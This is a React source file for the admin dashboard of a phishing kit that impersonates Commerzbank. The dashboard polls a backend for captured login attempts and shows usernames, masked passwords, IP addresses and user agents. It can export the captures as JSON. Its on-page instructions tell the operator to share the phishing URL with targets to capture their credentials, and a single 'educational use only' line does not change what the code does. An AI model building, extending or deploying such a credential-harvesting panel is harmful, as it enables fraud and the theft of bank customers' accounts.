import { useQuery } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Trash2, RefreshCw, Download } from "lucide-react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

export default function AdminPanel() {
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const { data: attempts = [], isLoading } = useQuery({
    queryKey: ["/api/phishing-attempts"],
    refetchInterval: 2000, // Auto-refresh every 2 seconds
  });

  const { data: stats = {} } = useQuery({
    queryKey: ["/api/stats"],
    refetchInterval: 2000,
  });

  const clearDataMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("DELETE", "/api/phishing-attempts");
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/phishing-attempts"] });
      queryClient.invalidateQueries({ queryKey: ["/api/stats"] });
      toast({
        title: "Data Cleared",
        description: "All captured data has been removed.",
      });
    },
  });

  const resetMutation = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/reset");
      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/stats"] });
      queryClient.invalidateQueries({ queryKey: ["/api/phishing-attempts"] });
      toast({
        title: "System Reset",
        description: "All data cleared and counters reset.",
      });
    },
  });

  const exportData = async () => {
    try {
      const response = await fetch('/api/phishing-attempts', {
        credentials: 'include',
      });
      const data = await response.json();
      
      const exportData = {
        exportDate: new Date().toISOString(),
        attempts: data,
        totalAttempts: data.length,
      };

      const blob = new Blob([JSON.stringify(exportData, null, 2)], {
        type: 'application/json',
      });
      
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `commerzbank-captures-${new Date().toISOString().split('T')[0]}.json`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      toast({
        title: "Data Exported",
        description: "Captured data has been downloaded.",
      });
    } catch (error) {
      toast({
        title: "Export Failed",
        description: "Could not export data.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-gray-900">Admin Panel</h1>
              <p className="text-gray-600 mt-1">Commerzbank Security Monitoring</p>
            </div>
            <div className="flex space-x-3">
              <Button
                onClick={() => window.open('/download', '_blank')}
                variant="outline"
                className="bg-green-50 border-green-200 text-green-700 hover:bg-green-100"
              >
                <Download className="h-4 w-4 mr-2" />
                Download Source
              </Button>
              <Button
                onClick={exportData}
                variant="outline"
                className="bg-blue-50 border-blue-200 text-blue-700 hover:bg-blue-100"
              >
                <Download className="h-4 w-4 mr-2" />
                Export Data
              </Button>
              <Button
                onClick={() => clearDataMutation.mutate()}
                disabled={clearDataMutation.isPending}
                variant="outline"
                className="bg-orange-50 border-orange-200 text-orange-700 hover:bg-orange-100"
              >
                <Trash2 className="h-4 w-4 mr-2" />
                Clear Data
              </Button>
              <Button
                onClick={() => resetMutation.mutate()}
                disabled={resetMutation.isPending}
                className="bg-red-600 hover:bg-red-700 text-white"
              >
                <RefreshCw className="h-4 w-4 mr-2" />
                Reset System
              </Button>
            </div>
          </div>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">Total Captures</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-gray-900">{(stats as any)?.totalAttempts || 0}</div>
            </CardContent>
          </Card>
          
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">Active Sessions</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold text-green-600">Live</div>
            </CardContent>
          </Card>
          
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm font-medium text-gray-600">Last Reset</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-sm text-gray-600">
                {(stats as any)?.lastReset ? new Date((stats as any).lastReset).toLocaleString() : 'Never'}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Captured Data Table */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center">
              <span className="mr-2">🎯</span>
              Captured Login Attempts
              <Badge className="ml-3 bg-red-100 text-red-700">
                {Array.isArray(attempts) ? attempts.length : 0} entries
              </Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="text-center py-8 text-gray-500">Loading captured data...</div>
            ) : !Array.isArray(attempts) || attempts.length === 0 ? (
              <div className="text-center py-8 text-gray-500">
                No login attempts captured yet
                <br />
                <span className="text-sm">Data will appear here when users submit the form</span>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b">
                      <th className="text-left py-3 px-4 font-medium text-gray-600">Timestamp</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">IP Address</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">Username</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">Password</th>
                      <th className="text-left py-3 px-4 font-medium text-gray-600">User Agent</th>
                    </tr>
                  </thead>
                  <tbody>
                    {Array.isArray(attempts) && attempts.map((attempt: any) => (
                      <tr key={attempt.id} className="border-b hover:bg-gray-50">
                        <td className="py-3 px-4 text-sm text-gray-900">
                          {new Date(attempt.timestamp).toLocaleString()}
                        </td>
                        <td className="py-3 px-4">
                          <Badge variant="outline" className="font-mono text-xs">
                            {attempt.ipAddress}
                          </Badge>
                        </td>
                        <td className="py-3 px-4 font-mono text-sm text-blue-700">
                          {attempt.username}
                        </td>
                        <td className="py-3 px-4 font-mono text-sm text-red-700">
                          {'•'.repeat(attempt.password.length)}
                        </td>
                        <td className="py-3 px-4 text-xs text-gray-500 max-w-xs truncate">
                          {attempt.userAgent || 'Unknown'}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Instructions */}
        <Card className="mt-8 bg-blue-50 border-blue-200">
          <CardContent className="p-6">
            <h3 className="font-bold text-blue-900 mb-2">📋 Instructions</h3>
            <div className="text-blue-800 space-y-1 text-sm">
              <p>• This panel shows login attempts captured from the phishing site</p>
              <p>• Data updates automatically every 2 seconds</p>
              <p>• Share the phishing site URL with targets to capture their credentials</p>
              <p>• Use "Export Data" to download captures as JSON file</p>
              <p>• Educational use only - ensure proper authorization before deployment</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}